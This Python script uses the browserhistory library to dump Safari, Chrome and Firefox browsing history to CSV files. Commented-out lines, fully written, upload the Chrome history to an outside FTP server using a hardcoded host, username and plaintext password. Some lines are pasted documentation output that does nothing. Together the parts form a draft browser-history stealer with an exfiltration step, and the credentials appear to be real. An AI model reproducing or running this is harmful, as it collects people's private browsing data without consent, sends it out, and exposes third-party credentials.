import ftplib
import browserhistory as bh
from datetime import datetime
import time



# FTP_HOST = "ftp.techtradesystems.com"
# FTP_USER = "testftp@thinktank.techtradesystems.com"
# FTP_PASS = "s0Zu?Y1eo0ug"
#
#
# # connect to the FTP server
# ftp = ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS)
# print(ftp)


# force UTF-8 encoding
# ftp.encoding = "utf-8"
currenttime=time.time()
dt= datetime.now()
d=dt.strftime("%b-%d-%y_%H-%M-%S")
rem=str(d)

dict_obj = bh.get_browserhistory()
dict_obj.keys()
# dict_keys(['safari', 'chrome', 'firefox'])
dict_obj['chrome'][0]
('https://mail.google.com', 'Mail', '2018-08-14 08:27:26')
# Write the data to csv files in the current working directory.
# safari_browserhistory.csv, chrome_browserhistory.csv, and firefox_browerhistory.csv.
files=bh.write_browserhistory_csv()
# Create csv files that contain broswer history
# with open(chrome_browserhistory.csv, "rb") as file:
   # use FTP's STOR command to upload the file
   # ftp.storbinary(f"STOR {chrome_browserhistory.csv}",file)
